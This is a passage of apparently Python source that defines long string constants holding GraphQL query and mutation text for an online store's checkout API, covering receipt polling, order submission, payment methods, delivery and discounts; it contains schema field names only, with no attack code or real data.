    "...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename "
    "percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{"
    "...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}"
    "landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded "
    "nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index "
    "__typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties "
    "refuseDutiesPermitted __typename}attribution{attributions{"
    "...on RetailAttributions{deviceId locationId userId __typename}"
    "...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId "
    "__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{"
    "recipient{...on StaffMember{id __typename}...on Location{id __typename}"
    "...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{"
    "...FilledMerchandiseLineTargetCollectionFragment"
    "...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}"
    "__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token "
    "__typename}...on PendingTerms{taskId pollDelay __typename}__typename}"
    "cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}"
    "alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount "
    "currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}"
    "stableId __typename}__typename}__typename}isShippingRequired __typename}"
    "fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename"
    "...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime "
    "maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl "
    "lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}"
    "deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}"
    "promiseProviderApiClientId signedHandle returnability __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}"
    "fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource "
    "redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{"
    "firstName lastName company address1 address2 city countryCode zoneCode postalCode phone "
    "__typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount "
    "currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}"
    "...on StoreCreditRedemptionContent{storeCreditAccountId __typename}"
    "...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier "
    "paymentMethodIdentifier __typename}__typename}__typename}"
    "fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{"
    "handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{"
    "smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target "
    "namespace value __typename}appName extensionLocale extensionPoints name registrationUuid "
    "scriptUrl translations uuid version __typename}__typename}"
    "fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{"
    "cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod "
    "deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 "
    "address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}"
    "__typename}__typename}"
    "fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{"
    "paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city "
    "company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}"
    "__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt "
    "paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{"
    "...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}"
    "...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}"
    "...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}"
    "...on WalletsPlatformPaymentMethod{name walletParams __typename}"
    "...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken "
    "paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:"
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}"
    "__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt "
    "merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits "
    "paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash "
    "transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage "
    "protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{"
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}"
    "__typename}containerData containerId mode paymentMethodIdentifier __typename}"
    "...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}"
    "disclosureDetails{evidence id type __typename}installmentsToken sessionToken "
    "paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{"
    "paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank "
    "__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails "
    "paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{"
    "paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails "
    "paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{"
    "paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name "
    "paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName "
    "__typename}...on CustomerCreditCardPaymentMethod{"
    "...CustomerCreditCardPaymentMethodFragment __typename}"
    "...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment "
    "__typename}...on NoopPaymentMethod{__typename}__typename}__typename}"
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,"
    "sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl "
    "confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments "
    "analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{"
    "buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{"
    "...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{"
    "paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}"
    "paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{"
    "...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}"
    "shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules "
    "shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload "
    "shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay "
    "orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested "
    "postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename "
    "dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{"
    "...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay "
    "__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect "
    "url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id "
    "processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{"
    "__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated "
    "hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}"
    "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
    "fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount "
    "currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{"
    "deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType "
    "brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl "
    "lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name "
    "address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude "
    "longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{"
    "address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude "
    "longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl "
    "fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long "
    "__typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}discountRecurringCycleLimit "
    "excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId "
    "quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{"
    "...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}"
    "__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity "
    "merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails "
    "__typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity "
    "componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}"
    "__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount "
    "currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}__typename}groupType targetMerchandise{"
    "...on PurchaseOrderMerchandiseLine{stableId quantity{"
    "...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{"
    "...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}"
    "__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity "
    "merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails "
    "__typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId "
    "componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}"
    "__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle "
    "lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle "
    "deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable "
    "__typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename"
    "...on StreetAddress{name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}"
    "postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId "
    "paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}"
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable "
    "defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{"
    "...on StreetAddress{address1 address2 city company countryCode firstName lastName phone "
    "postalCode zoneCode __typename}__typename}__typename}"
    "...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code "
    "__typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{"
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}"
    "__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}"
    "...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}"
    "...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}data signature version __typename}"
    "...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion "
    "__typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName "
    "lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}"
    "...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}"
    "disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand "
    "lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name "
    "walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName "
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}additionalParameters{"
    "...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}"
    "...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier "
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{"
    "paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName "
    "company address1 address2 city countryCode zoneCode postalCode coordinates{latitude "
    "longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}"
    "__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id "
    "paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on CustomPaymentMethod{additionalDetails name paymentInstructions id "
    "paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on DeferredPaymentMethod{orderingIndex displayName __typename}"
    "...on PaypalBillingAgreementPaymentMethod{token billingAddress{"
    "...on StreetAddress{address1 address2 city company countryCode firstName lastName phone "
    "postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{"
    "redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind "
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}"
    "...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier "
    "paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId "
    "__typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name "
    "__typename}__typename}__typename}__typename}__typename}buyerIdentity{"
    "...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{"
    "email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}"
    "marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}"
    "...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{"
    "__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}"
    "__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName "
    "countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone "
    "__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{"
    "editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName "
    "acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone "
    "market{id handle __typename}__typename}}purchasingCompany{company{id externalId name "
    "__typename}contact{locationCount __typename}location{id externalId name __typename}"
    "__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee "
    "merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{"
    "...PurchaseOrderLineComponent __typename}quantity{__typename"
    "...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{"
    "__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{"
    "__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}"
    "__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{"
    "amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}"
    "totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{"
    "...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees "
    "totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode "
    "__typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}"
    "optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{"
    "tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping "
    "note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{"
    "vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}"
    "checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount "
    "currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{"
    "__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt "
    "subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}}__typename}metafields{key namespace value valueType:type __typename}}"
    "fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId "
    "options{name value __typename}productTitle title productUrl untranslatedTitle "
    "untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid "
    "subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval "
    "deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}"
    "digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}price{amount currencyCode __typename}productId productType properties{"
    "...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit "
    "value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{"
    "...on MerchandisePropertyValueString{string:value __typename}"
    "...on MerchandisePropertyValueInt{int:value __typename}"
    "...on MerchandisePropertyValueFloat{float:value __typename}"
    "...on MerchandisePropertyValueBoolean{boolean:value __typename}"
    "...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}"
    "fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description "
    "presentationLevel allocationMethod targetSelection targetType signature signatureUuid type "
    "value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem "
    "fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel "
    "allocationMethod message targetSelection targetType value{...on PercentageValue{percentage "
    "__typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}"
    "...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection "
    "targetType value{...on PercentageValue{percentage __typename}"
    "...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}"
    "fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId "
    "merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}totalAmount{__typename amount currencyCode}__typename}"
    "fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId "
    "componentCapabilities componentSource merchandise{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}totalAmount{__typename amount currencyCode}__typename}"
    "fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{"
    "...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}"
    "deliveryAllocations{amount{amount currencyCode __typename}discount{"
    "...DiscountDetailsFragment __typename}index stableId targetType __typename}"
    "merchandiseAllocations{amount{amount currencyCode __typename}discount{"
    "...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitFailed{reason __typename}...on SubmitRejected{"
    "buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}"
    "errors{...on NegotiationError{code localizedMessage nonLocalizedMessage "
    "localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}"
    "target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}"
    "target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}"
    "from to __typename}...on UnprocessableTermViolation{message{code localizedDescription "
    "__typename}target __typename}...on UnresolvableTermViolation{message{code "
    "localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code "
    "localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}"
    "...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}"
    "__typename}to{...on ApplyChangeValueInt{value __typename}"
    "...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}"
    "__typename}__typename}...on InputValidationError{field __typename}"
    "...on PendingTermViolation{__typename}__typename}__typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}"
    "__typename}...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
    "fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl "
    "confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments "
    "analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{"
    "buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{"
    "...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{"
    "paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}"
    "paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{"
    "...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}"
    "shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates "
    "shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible "
    "mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder "
    "buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl "
    "postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus "
    "paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}"
    "__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}"
    "pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url "
    "__typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id "
    "processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{"
    "__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated "
    "hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}"
    "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
    "fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount "
    "currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{"
    "deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType "
    "brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl "
    "lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name "
    "address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude "
    "longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{"
    "address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude "
    "longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl "
    "fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long "
    "__typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}discountRecurringCycleLimit "
    "excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId "
    "quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{"
    "...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}"
    "__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity "
    "merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails "
    "__typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity "
    "componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}"
    "__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount "
